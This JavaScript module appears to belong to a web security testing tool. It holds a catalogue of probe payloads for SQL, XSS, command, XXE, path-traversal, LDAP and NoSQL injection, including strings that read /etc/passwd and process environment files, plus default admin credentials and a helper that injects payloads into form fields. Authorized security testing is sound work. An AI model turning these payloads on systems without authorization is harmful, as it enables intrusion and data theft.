const payloadsByType = {
  sql: ["' OR 1=1 --", "' OR 'a'='a", "admin' --", "' UNION SELECT NULL --"],
  xss: [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '" onmouseover="alert(1)"',
    '<svg/onload=alert(1)>'
  ],
  command: ['; whoami', '&& id', '| uname -a', '`whoami`', '|| ver'],
  xxe: [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><data>&xxe;</data>'
  ],
  pathtraversal: [
    '../../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
    '%2e%2e%2fetc%2fpasswd',
    '....//....//....//etc/passwd'
  ],
  ldap: ['*', 'admin*', '*)(|(uid=*))', 'admin)(|(password=*))', '*))%00'],
  nosql: [
    '{"$ne": null}',
    '{"$gt": ""}',
    '{"$regex": ".*"}',
    '{"$where": "1==1"}',
    '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
  ],
  fileupload: [
    {
      name: 'upload_probe.php',
      mimeType: 'application/octet-stream',
      content: 'SECURITY_TEST_FILE_UPLOAD_PROBE_PHP'
    },
    {
      name: 'upload_probe.jsp',
      mimeType: 'application/octet-stream',
      content: 'SECURITY_TEST_FILE_UPLOAD_PROBE_JSP'
    },
    {
      name: 'upload_probe.aspx',
      mimeType: 'application/octet-stream',
      content: 'SECURITY_TEST_FILE_UPLOAD_PROBE_ASPX'
    }
  ],
  auth: [
    { username: 'admin', password: 'admin' },
    { username: 'admin', password: 'admin123' },
    { username: 'root', password: 'root' },
    { username: 'test', password: 'test' },
    { username: 'guest', password: 'guest' }
  ]
};

function normalizeType(type) {
  return String(type || '').toLowerCase().replace(/[\s_-]/g, '');
}

function getPayloadTypes() {
  return ['sql', 'xss', 'command', 'xxe', 'pathTraversal', 'ldap', 'nosql', 'fileUpload', 'auth'];
}

function getPayloads(type) {
  if (!type) {
    return {
      sql: payloadsByType.sql,
      xss: payloadsByType.xss,
      command: payloadsByType.command,
      xxe: payloadsByType.xxe,
      pathTraversal: payloadsByType.pathtraversal,
      ldap: payloadsByType.ldap,
      nosql: payloadsByType.nosql,
      fileUpload: payloadsByType.fileupload,
      auth: payloadsByType.auth
    };
  }

  const normalizedType = normalizeType(type);
  const payloads = payloadsByType[normalizedType];

  if (!payloads) {
    throw new Error(`Unsupported payload type: ${type}`);
  }

  return payloads;
}

function pickPayload(type, index = 0) {
  const list = getPayloads(type);

  if (!Array.isArray(list) || list.length === 0) {
    throw new Error(`No payloads available for type: ${type}`);
  }

  const safeIndex = Number.isInteger(index) ? index : Number.parseInt(index, 10);
  if (Number.isNaN(safeIndex) || safeIndex < 0 || safeIndex >= list.length) {
    throw new Error(`Payload index out of range. Allowed range: 0-${list.length - 1}`);
  }

  return list[safeIndex];
}

function injectPayload(inputs, payload) {
  if (!Array.isArray(inputs) || inputs.length === 0) {
    throw new Error('inputs must be a non-empty array');
  }

  const data = {};
  for (const input of inputs) {
    if (typeof input === 'string' && input.trim()) {
      data[input] = payload;
      continue;
    }

    if (input && typeof input.name === 'string' && input.name.trim()) {
      data[input.name] = payload;
    }
  }

  if (Object.keys(data).length === 0) {
    throw new Error('No valid input names found for payload injection');
  }

  return data;
}

module.exports = {
  getPayloadTypes,
  getPayloads,
  pickPayload,
  injectPayload
};
